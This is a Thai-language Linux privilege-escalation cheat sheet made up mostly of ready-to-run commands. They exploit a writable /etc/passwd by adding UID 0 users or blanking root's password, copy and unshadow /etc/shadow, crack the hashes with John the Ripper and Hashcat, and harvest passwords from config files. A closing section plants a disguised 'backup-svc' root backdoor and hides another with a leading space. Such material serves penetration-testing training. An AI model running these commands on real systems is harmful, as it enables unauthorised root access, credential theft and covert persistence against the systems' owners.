#privesc #linux #password #hash-cracking

# Password File Exploitation

> [!info] Overview
> การใช้ประโยชน์จากไฟล์ /etc/passwd เป็นเทคนิคการยกระดับสิทธิ์ที่เกิดจากการที่ไฟล์นี้มีสิทธิ์เขียนได้ ทำให้เราสามารถเพิ่ม user ใหม่ที่มี UID 0 (root) หรือแก้ไข user ที่มีอยู่ได้ นอกจากนี้ยังครอบคลุมเทคนิคการ crack password hashes

## Table of Contents
- [[#Passwd File Structure]]
- [[#Basic Exploitation]]
- [[#Hash Generation]]
- [[#Password Cracking with John the Ripper]]
- [[#Password Cracking with Hashcat]]
- [[#Advanced Techniques]]

---

## Passwd File Structure

### Understanding /etc/passwd
ไฟล์ /etc/passwd เก็บข้อมูลผู้ใช้ในระบบ Linux

```bash
# ดูเนื้อหาไฟล์ /etc/passwd
cat /etc/passwd

# โครงสร้างของแต่ละบรรทัด:
# username:password:UID:GID:comment:home:shell
# ตัวอย่าง:
# root:x:0:0:root:/root:/bin/bash
# john:x:1000:1000:John Doe:/home/john:/bin/bash
```

#### Field Explanation
1. **Username** - ชื่อผู้ใช้
2. **Password** - `x` หมายถึง password เก็บใน /etc/shadow, hash ตรงนี้ได้
3. **UID** - User ID (0 = root)
4. **GID** - Group ID
5. **Comment/GECOS** - ข้อมูลเพิ่มเติม
6. **Home Directory** - home directory ของ user
7. **Shell** - default shell

### Check Writable Passwd
```bash
# ตรวจสอบว่าสามารถแก้ไข /etc/passwd ได้หรือไม่
ls -la /etc/passwd

# ถ้าแสดง permission แบบนี้ แปลว่าแก้ไขได้
# -rw-rw-r-- 1 root root 1234 Jan 01 12:00 /etc/passwd

# ทดสอบเขียนไฟล์
echo "test" >> /etc/passwd 2>/dev/null && echo "Writable!" || echo "Not writable"
```

---

## Basic Exploitation

### Method 1: Add Root User with Password Hash
```bash
# 1. ตรวจสอบว่าแก้ไข passwd ได้
cat /etc/passwd

# 2. สร้าง password hash ด้วย openssl
openssl passwd -1 -salt drasogun mypassword123
# Output: $1$drasogun$randomhashstring

# 3. เพิ่ม user ใหม่ที่มี UID 0 (root privileges)
echo 'drasogun:$1$drasogun$randomhashstring:0:0:drasogun:/root:/bin/bash' >> /etc/passwd

# 4. เข้าสู่ระบบด้วย user ใหม่
su drasogun
# Password: mypassword123

# 5. ตรวจสอบว่าได้สิทธิ์ root
id
whoami
```

### Method 2: Replace Existing User's Hash
```bash
# 1. สร้าง password hash
openssl passwd -1 newpassword
# บันทึก hash ที่ได้

# 2. แก้ไขไฟล์ /etc/passwd โดยตรง
# เปลี่ยน 'x' ใน field ที่ 2 เป็น hash ที่สร้างไว้
nano /etc/passwd

# จาก: root:x:0:0:root:/root:/bin/bash
# เป็น: root:$1$salt$hash:0:0:root:/root:/bin/bash

# 3. เข้าสู่ระบบด้วย password ใหม่
su root
# Password: newpassword
```

### Method 3: Remove Password
```bash
# ลบ password field ออก (ไม่ต้องใส่ password)
# เปลี่ยน root:x:0:0:... เป็น root::0:0:...
sed -i 's/^root:x:/root::/' /etc/passwd

# ตอนนี้สามารถ su เป็น root โดยไม่ต้องใส่ password
su root
```

---

## Hash Generation

> [!tip] Password Hash Types
> Linux รองรับหลายแบบ: MD5 ($1$), SHA-256 ($5$), SHA-512 ($6$)

### OpenSSL Hash Generation
```bash
# MD5-based hash (ไม่ค่อยปลอดภัย แต่รวดเร็ว)
openssl passwd -1 mypassword

# MD5 with custom salt
openssl passwd -1 -salt mysalt mypassword

# SHA-256 hash (ปลอดภัยกว่า)
openssl passwd -5 mypassword

# SHA-512 hash (ปลอดภัยที่สุด)
openssl passwd -6 mypassword
```

### Python Hash Generation
```python
#!/usr/bin/env python3
# generate_hash.py - สร้าง password hash สำหรับ Linux
import crypt
import getpass

# รับ password จาก user
password = getpass.getpass("Enter password: ")

# สร้าง SHA-512 hash
hash_512 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
print(f"SHA-512: {hash_512}")

# สร้าง SHA-256 hash
hash_256 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA256))
print(f"SHA-256: {hash_256}")

# สร้าง MD5 hash
hash_md5 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_MD5))
print(f"MD5: {hash_md5}")
```

### Perl One-liner
```bash
# สร้าง hash ด้วย Perl
perl -le 'print crypt("mypassword", "salt")'

# SHA-512 hash
perl -le 'print crypt("mypassword", "\$6\$salt\$")'
```

---

## Password Cracking with John the Ripper

> [!note] John the Ripper
> เครื่องมือ crack password ที่รวดเร็วและมีประสิทธิภาพ รองรับหลายรูปแบบของ hash

### Basic Usage
```bash
# ติดตั้ง John the Ripper
sudo apt install john

# Crack /etc/shadow โดยตรง
sudo john /etc/shadow

# ใช้ wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# แสดง passwords ที่ crack ได้
john --show hashes.txt
```

### Combine Passwd and Shadow Files
```bash
# รวมไฟล์ passwd และ shadow เพื่อ crack
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack combined file ด้วย wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# ดูผลลัพธ์
john --show unshadowed.txt
```

### Advanced John Techniques
```bash
# Crack with rules (เพิ่มการ mutation ของ password)
john --wordlist=wordlist.txt --rules unshadowed.txt

# Incremental mode (brute force)
john --incremental unshadowed.txt

# Specify hash format
john --format=sha512crypt hashes.txt

# Crack MD5 hashes
john --format=md5crypt-long hashes.txt

# Session management (resume cracking)
john --session=mysession hashes.txt
john --restore=mysession

# Show cracking progress
john --status
```

### Create Custom Wordlist
```bash
# สร้าง wordlist จาก website
cewl http://target.com -w custom_wordlist.txt

# ใช้ custom wordlist กับ John
john --wordlist=custom_wordlist.txt --rules hashes.txt
```

---

## Password Cracking with Hashcat

> [!warning] Hashcat - GPU-Accelerated Cracking
> Hashcat ใช้ GPU เพื่อ crack passwords ได้เร็วกว่า John the Ripper หลายเท่าตัว

### Basic Hashcat Usage
```bash
# ติดตั้ง Hashcat
sudo apt install hashcat

# ตรวจสอบ hash modes ที่รองรับ
hashcat --example-hashes | grep -i sha512

# Crack SHA-512 hash (mode 1800)
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack MD5 crypt (mode 500)
hashcat -m 500 -a 0 hashes.txt wordlist.txt

# Crack SHA-256 crypt (mode 7400)
hashcat -m 7400 -a 0 hashes.txt wordlist.txt
```

### Hash Modes
```bash
# Common Linux hash modes:
# 500  = md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
# 1800 = sha512crypt $6$, SHA512 (Unix)
# 7400 = sha256crypt $5$, SHA256 (Unix)
# 3200 = bcrypt $2*$, Blowfish (Unix)

# Example: Crack SHA-512 crypt
hashcat -m 1800 '$6$salt$hash' /usr/share/wordlists/rockyou.txt
```

### Attack Modes
```bash
# -a 0: Straight/Dictionary attack
hashcat -m 1800 -a 0 hashes.txt wordlist.txt

# -a 1: Combination attack (รวม 2 wordlists)
hashcat -m 1800 -a 1 wordlist1.txt wordlist2.txt

# -a 3: Brute-force attack
hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a

# -a 6: Hybrid Wordlist + Mask
hashcat -m 1800 -a 6 wordlist.txt ?d?d?d?d

# -a 7: Hybrid Mask + Wordlist
hashcat -m 1800 -a 7 ?d?d?d?d wordlist.txt
```

### Mask Attack (Brute Force)
```bash
# Character sets:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digits (0-9)
# ?s = special characters
# ?a = all characters

# ตัวอย่าง: password 8 ตัว ตัวอักษรและตัวเลข
hashcat -m 1800 -a 3 hashes.txt ?l?l?l?l?d?d?d?d

# ตัวอย่าง: Password123! pattern
hashcat -m 1800 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d?d?s
```

### Rule-based Attack
```bash
# ใช้ rules เพื่อ mutate passwords
hashcat -m 1800 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Built-in rules:
# - best64.rule (ดีที่สุดสำหรับการ crack ทั่วไป)
# - rockyou-30000.rule
# - dive.rule (รวม rules เยอะมาก)

# ใช้หลาย rules พร้อมกัน
hashcat -m 1800 -a 0 hashes.txt wordlist.txt -r best64.rule -r toggles1.rule
```

### Performance Optimization
```bash
# แสดง devices ที่ใช้ได้ (GPU/CPU)
hashcat -I

# ใช้เฉพาะ GPU
hashcat -m 1800 -a 0 -d 1 hashes.txt wordlist.txt

# เพิ่ม workload (ระวัง overheating)
hashcat -m 1800 -a 0 -w 3 hashes.txt wordlist.txt

# Benchmark hash mode
hashcat -b -m 1800
```

---

## Advanced Techniques

### Extract Hashes from System
```bash
# คัดลอกไฟล์ passwd และ shadow
cat /etc/passwd > passwd.txt
sudo cat /etc/shadow > shadow.txt

# รวมไฟล์ด้วย unshadow
unshadow passwd.txt shadow.txt > combined.txt

# กรองเอาเฉพาะ hashes ที่ crack ได้
grep -v ':*:' combined.txt > crackable.txt
```

### Hash Identification
```bash
# ใช้ hashid เพื่อระบุชนิดของ hash
hashid '$6$salt$hash'

# ใช้ hash-identifier
hash-identifier
# จากนั้นวาง hash เข้าไป

# John the Ripper auto-detect
john hashes.txt
```

### Dictionary Generation
```bash
# Crunch - สร้าง wordlist แบบ custom
crunch 8 8 -t pass%%%% > passwords.txt
# สร้าง passwords: pass0000 ถึง pass9999

# สร้าง wordlist จาก pattern
crunch 6 10 abcdef123456 -o output.txt

# Maskprocessor - สร้าง wordlist จาก mask
mp64 ?l?l?l?l?d?d?d?d > wordlist.txt
```

### Credential Harvesting
```bash
# ค้นหาไฟล์ที่อาจมี passwords
grep -ri "password" /home/ 2>/dev/null
grep -ri "passwd" /var/www/ 2>/dev/null

# ค้นหา configuration files
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# ค้นหา database connection strings
find / -name "*.php" -exec grep -l "mysql_connect\|mysqli_connect" {} \; 2>/dev/null
```

---

## Hash Cracking Strategies

> [!tip] Cracking Strategy
> 1. เริ่มด้วย common passwords (top 1000)
> 2. ใช้ wordlist ขนาดกลาง (rockyou.txt)
> 3. ใช้ rules เพื่อ mutate passwords
> 4. ใช้ mask attack สำหรับ pattern ที่คาดเดาได้
> 5. Brute force เป็นทางเลือกสุดท้าย (ใช้เวลานาน)

### Step-by-Step Strategy
```bash
# 1. Quick win - common passwords
hashcat -m 1800 hashes.txt /usr/share/wordlists/fasttrack.txt

# 2. Rockyou wordlist
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

# 3. Rockyou with rules
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# 4. Mask attack for common patterns
# Pattern: Capital letter + lowercase + numbers
hashcat -m 1800 -a 3 hashes.txt ?u?l?l?l?l?l?d?d

# 5. Hybrid attack
hashcat -m 1800 -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d

# 6. ถ้ายังไม่ได้ ใช้ brute force
hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
```

---

## Persistence via Passwd

### Create Backdoor User
```bash
# สร้าง backdoor user ที่ชื่อดูไม่น่าสงสัย
openssl passwd -1 -salt backup backuppass123
echo 'backup-svc:$1$backup$hash:0:0:Backup Service:/var/backup:/bin/bash' >> /etc/passwd

# ซ่อน user ด้วยการเพิ่มช่องว่าง
echo ' backup:$1$backup$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## Related Techniques
- [[Privilege Escalation]]
- [[Linux Enumeration]]
- [[John the Ripper]]
- [[Hashcat]]
- [[Password Attacks]]

## References
- John the Ripper Documentation: https://www.openwall.com/john/
- Hashcat Wiki: https://hashcat.net/wiki/
- HackTricks: Brute Force - CheatSheet
- Linux Password Security: man crypt(3)